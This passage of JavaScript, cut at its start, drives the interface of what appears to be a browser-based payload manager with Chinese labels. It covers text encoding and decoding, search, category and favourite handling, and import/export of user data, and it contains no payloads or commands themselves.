      encode: encodeUnicode,
      decode: decodeUnicode
    },
    hex: {
      hint: "UTF-8 字节转十六进制（无分隔），解码时忽略空白与 0x 前缀",
      encode: encodeHex,
      decode: decodeHex
    },
    json: {
      hint: "JSON 字符串转义，输出带引号的字符串字面量",
      encode: function (text) { return JSON.stringify(String(text)); },
      decode: function (text) {
        var value = JSON.parse(text);
        if (typeof value !== "string") throw new Error("JSON 结果不是字符串");
        return value;
      }
    }
  };

  function updateCodecUI() {
    var conf = CODECS[state.codec] || CODECS.url;
    els.codecHint.textContent = conf.hint;
    var buttons = els.codecBar.querySelectorAll("[data-codec]");
    for (var i = 0; i < buttons.length; i++) {
      buttons[i].classList.toggle("active", buttons[i].getAttribute("data-codec") === state.codec);
    }
  }

  function runCodec(mode) {
    var raw = els.encodeInput.value;
    if (!raw) {
      toast("请先输入需要处理的文本", "error");
      els.encodeInput.focus();
      return;
    }
    var conf = CODECS[state.codec] || CODECS.url;
    try {
      var result = mode === "decode" ? conf.decode(raw) : conf.encode(raw);
      els.encodeOutput.value = result;
    } catch (err) {
      els.encodeOutput.value = "";
      toast("处理失败：" + (err && err.message ? err.message : "输入格式不正确"), "error");
    }
  }

  function copyCodecOutput() {
    var text = els.encodeOutput.value;
    if (!text) {
      toast("暂无可复制的结果", "error");
      return;
    }
    handleCopyButton(els.copyOutputBtn, text, "复制结果");
  }


  /* ==================== 事件绑定 ==================== */
  function bindEvents() {
    var searchTimer = 0;

    els.tabPayload.addEventListener("click", function () { switchTab("payload"); });
    els.tabEncode.addEventListener("click", function () { switchTab("encode"); });

    els.searchInput.addEventListener("input", function () {
      var value = els.searchInput.value.replace(/^\s+|\s+$/g, "");
      window.clearTimeout(searchTimer);
      searchTimer = window.setTimeout(function () {
        var current = els.searchInput.value.replace(/^\s+|\s+$/g, "");
        if (current !== value || value === state.search) return;
        state.search = value;
        state.selectMode = false;
        state.selected = {};
        els.clearSearchBtn.classList.toggle("hidden", !value);
        renderNav();
        renderContent();
        els.cardList.scrollTop = 0;
      }, 120);
    });

    els.clearSearchBtn.addEventListener("click", clearSearch);
    els.addPayloadBtn.addEventListener("click", function () { openPayloadModal("add", null); });
    els.dataBtn.addEventListener("click", openDataModal);

    els.batchBtn.addEventListener("click", function () { setSelectMode(!state.selectMode); });
    els.copyAllBtn.addEventListener("click", copyAllCurrent);
    els.exitSelectBtn.addEventListener("click", function () { setSelectMode(false); });
    els.deleteSelectedBtn.addEventListener("click", deleteSelected);

    els.selectAllCheck.addEventListener("change", function () {
      var customs = getVisibleList().filter(function (item) { return !item.builtin; });
      state.selected = {};
      if (els.selectAllCheck.checked) {
        customs.forEach(function (item) { state.selected[item.id] = true; });
      }
      renderContent();
    });

    els.catNav.addEventListener("click", function (e) {
      var actionEl = e.target.closest("[data-cat-action]");
      if (!actionEl) return;
      var action = actionEl.getAttribute("data-cat-action");
      var row = actionEl.closest(".cat-row");
      var cat = row ? row.getAttribute("data-cat") : "";

      if (action === "select") selectCategory(cat);
      else if (action === "rename") openCategoryModal("rename", cat);
      else if (action === "delete") askDeleteCategory(cat);
      else if (action === "new") openCategoryModal("new", "");
    });

    els.cardList.addEventListener("click", function (e) {
      var actionEl = e.target.closest("[data-action]");
      if (!actionEl) return;
      var action = actionEl.getAttribute("data-action");

      if (action === "clear-search") { clearSearch(); return; }
      if (action === "go-sql") { selectCategory(BUILTIN_CATEGORIES[0]); return; }
      if (action === "add-payload") { openPayloadModal("add", null); return; }

      var card = actionEl.closest(".card");
      var id = card ? card.getAttribute("data-id") : "";
      if (!id) return;
      var item = findPayloadById(id);
      if (!item) return;

      if (action === "copy") {
        handleCopyButton(actionEl, item.payload, "复制");
      } else if (action === "fav") {
        toggleFavorite(id);
      } else if (action === "encode") {
        sendToCodec(item.payload);
      } else if (action === "edit") {
        openPayloadModal("edit", id);
      } else if (action === "delete") {
        askDeletePayload(item);
      }
    });

    els.cardList.addEventListener("change", function (e) {
      var cb = e.target.closest('[data-role="select"]');
      if (!cb) return;
      var card = cb.closest(".card");
      var id = card ? card.getAttribute("data-id") : "";
      if (!id) return;
      if (cb.checked) state.selected[id] = true;
      else delete state.selected[id];
      card.classList.toggle("selected", cb.checked);
      updateSelectBar();
    });

    els.payloadForm.addEventListener("submit", function (e) {
      e.preventDefault();
      savePayload();
    });

    els.payloadCategory.addEventListener("change", function () {
      var isNew = els.payloadCategory.value === NEW_CAT_VALUE;
      els.newCatField.classList.toggle("hidden", !isNew);
      clearPayloadError();
      if (isNew) els.newCategoryInput.focus();
    });

    els.payloadContent.addEventListener("keydown", function (e) {
      if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
        e.preventDefault();
        if (typeof els.payloadForm.requestSubmit === "function") els.payloadForm.requestSubmit();
        else els.payloadForm.dispatchEvent(new Event("submit", { cancelable: true, bubbles: true }));
      }
    });

    els.categoryForm.addEventListener("submit", function (e) {
      e.preventDefault();
      saveCategory();
    });

    els.confirmOkBtn.addEventListener("click", function () { finishConfirm(true); });

    els.exportBtn.addEventListener("click", exportData);
    els.importPickBtn.addEventListener("click", function () {
      els.importFile.value = "";
      els.importFile.click();
    });
    els.importFile.addEventListener("change", function () {
      var file = els.importFile.files && els.importFile.files[0];
      handleImportFile(file);
    });

    document.addEventListener("click", function (e) {
      var closer = e.target.closest("[data-close]");
      if (!closer) return;
      var modal = closer.closest(".modal");
      if (modal && modal.id) closeModal(modal.id);
    });

    els.overlay.addEventListener("click", function (e) {
      if (e.target !== els.overlay) return;
      var opened = MODAL_IDS.filter(function (id) {
        return !els[id].classList.contains("hidden");
      });
      if (opened.length) closeModal(opened[opened.length - 1]);
    });

    els.codecBar.addEventListener("click", function (e) {
      var btn = e.target.closest("[data-codec]");
      if (!btn) return;
      var codec = btn.getAttribute("data-codec");
      if (!CODECS[codec]) return;
      state.codec = codec;
      els.encodeOutput.value = "";
      updateCodecUI();
    });

    els.encodeBtn.addEventListener("click", function () { runCodec("encode"); });
    els.decodeBtn.addEventListener("click", function () { runCodec("decode"); });
    els.copyOutputBtn.addEventListener("click", copyCodecOutput);
    els.clearEncodeBtn.addEventListener("click", function () {
      els.encodeInput.value = "";
      els.encodeOutput.value = "";
      els.encodeInput.focus();
    });

    els.encodeInput.addEventListener("keydown", function (e) {
      if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
        e.preventDefault();
        runCodec("encode");
      }
    });

    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape") {
        var opened = MODAL_IDS.filter(function (id) {
          return !els[id].classList.contains("hidden");
        });
        if (opened.length) {
          e.preventDefault();
          closeModal(opened[opened.length - 1]);
          return;
        }
        if (state.tab === "payload" && (state.search || els.searchInput.value)) {
          e.preventDefault();
          clearSearch();
          return;
        }
        window.close();
        return;
      }

      if ((e.ctrlKey || e.metaKey) && (e.key === "f" || e.key === "F")) {
        e.preventDefault();
        if (state.tab !== "payload") switchTab("payload");
        els.searchInput.focus();
        els.searchInput.select();
      }
    });
  }

  /* ==================== 启动 ==================== */
  function init() {
    cacheElements();
    state.data = loadData();
    pruneFavorites();
    bindEvents();
    updateCodecUI();
    renderAll();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
